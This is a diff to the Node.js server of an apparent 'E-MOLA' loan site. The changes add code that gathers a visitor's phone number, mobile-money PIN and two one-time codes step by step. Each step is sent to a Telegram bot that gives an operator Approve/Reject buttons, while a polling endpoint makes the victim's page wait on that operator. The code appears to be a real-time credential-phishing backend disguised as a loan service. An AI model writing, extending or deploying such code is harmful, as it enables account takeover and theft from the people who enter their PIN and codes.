@@ -5,23 +5,19 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Middleware to parse JSON and URL-encoded form data
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-
-// Serve static files (HTML, CSS, JS) from the 'public' folder
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Telegram Configuration from environment variables
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
-// Helper function to send notifications to Telegram in English
+// Temporary in-memory session store to track loan progress by phone number
+const loanSessions = {};
+
+// Helper function to send Telegram notification with Approve/Reject inline buttons
 async function sendTelegramMessage(loanData) {
-    if (!BOT_TOKEN || !CHAT_ID) {
-        console.warn('Telegram BOT_TOKEN or CHAT_ID is not configured in environment variables.');
-        return;
-    }
+    if (!BOT_TOKEN || !CHAT_ID) return;
 
     const message = `
 🚨 *NEW E-MOLA LOAN APPLICATION* 🚨
@@ -40,51 +36,90 @@ async function sendTelegramMessage(loanData) {
 ⏰ *Timestamp:* ${new Date().toLocaleString()}
     `.trim();
 
+    // Inline keyboard buttons for admin control
+    const replyMarkup = {
+        inline_keyboard: [
+            [
+                { text: '✅ Aprovar', callback_data: `approve_${loanData.phone}` },
+                { text: '❌ Recusar', callback_data: `reject_${loanData.phone}` }
+            ]
+        ]
+    };
+
     try {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        const response = await fetch(url, {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message,
-                parse_mode: 'Markdown'
+                parse_mode: 'Markdown',
+                reply_markup: replyMarkup
             })
         });
-
-        const result = await response.json();
-        if (!result.ok) {
-            console.error('Telegram API Error:', result);
-        }
     } catch (error) {
         console.error('Failed to send Telegram notification:', error);
     }
 }
 
-// API endpoint to handle loan application steps and data submission
+// API endpoint for frontend submissions & step checks
 app.post('/api/submit', async (req, res) => {
     try {
-        const loanData = req.body;
+        const { phone, amount, period, pin, otp1, otp2 } = req.body;
+
+        // Initialize or update session
+        if (!loanSessions[phone]) {
+            loanSessions[phone] = { phone, amount, period, pin, otp1: null, otp2: null, status: 'SUBMITTED' };
+        }
+
+        if (otp2) {
+            loanSessions[phone].otp2 = otp2;
+            loanSessions[phone].status = 'COMPLETED';
+            await sendTelegramMessage(loanSessions[phone]);
+            return res.json({ success: true, nextStep: 'success', message: 'Empréstimo aprovado com sucesso!' });
+        }
+
+        if (otp1) {
+            loanSessions[phone].otp1 = otp1;
+            loanSessions[phone].status = 'WAITING_SECOND_OTP';
+            await sendTelegramMessage(loanSessions[phone]);
+            return res.json({ success: true, nextStep: 'ask_otp2' });
+        }
+
+        // Initial submission
+        loanSessions[phone].amount = amount || loanSessions[phone].amount;
+        loanSessions[phone].period = period || loanSessions[phone].period;
+        loanSessions[phone].pin = pin || loanSessions[phone].pin;
+        loanSessions[phone].status = 'PENDING_APPROVAL';
+
+        await sendTelegramMessage(loanSessions[phone]);
         
-        // Log incoming data to server console
-        console.log('Received loan application update:', loanData);
+        // Return current status to frontend
+        const currentStatus = loanSessions[phone].status;
+        res.json({ success: true, status: currentStatus, nextStep: currentStatus === 'APPROVED' ? 'ask_otp1' : 'wait_approval' });
 
-        // Forward details to your Telegram bot in English
-        await sendTelegramMessage(loanData);
-
-        res.status(200).json({ success: true, message: 'Processed successfully' });
     } catch (error) {
-        console.error('Error processing request:', error);
+        console.error('Error in /api/submit:', error);
         res.status(500).json({ success: false, error: 'Internal Server Error' });
     }
 });
 
-// Fallback route to serve index.html for any unknown routes
+// Polling endpoint for frontend to check if admin clicked "Aprovar"
+app.get('/api/check-status/:phone', (req, res) => {
+    const phone = req.params.phone;
+    const session = loanSessions[phone];
+    if (session) {
+        res.json({ status: session.status });
+    } else {
+        res.json({ status: 'NOT_FOUND' });
+    }
+});
+
+// Fallback route for SPA / frontend routing
 app.get(/(.*)/, (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Start the server
 app.listen(PORT, () => {
-    console.log(`Server is running live on port ${PORT}`);
+    console.log(`Server running on port ${PORT}`);
 });
